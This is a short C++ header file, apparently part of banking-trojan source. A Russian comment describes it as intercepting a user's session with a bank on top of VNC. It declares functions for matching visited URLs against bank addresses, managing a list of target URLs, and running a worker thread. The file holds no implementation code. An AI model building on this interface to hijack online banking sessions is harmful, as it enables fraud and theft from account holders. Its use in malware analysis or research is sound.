/*

	Перехват сессии пользователя с банком (надстройка над VNC)

*/
#pragma once

namespace bank
{
	void init(void);

	void uninit(void);

	void _matchBank(LPSTR url);

	bool isBlank();

	void WINAPI proc(void*);

	bool _addStatic(LPSTR url);

	bool _removeStatic(LPSTR url);
}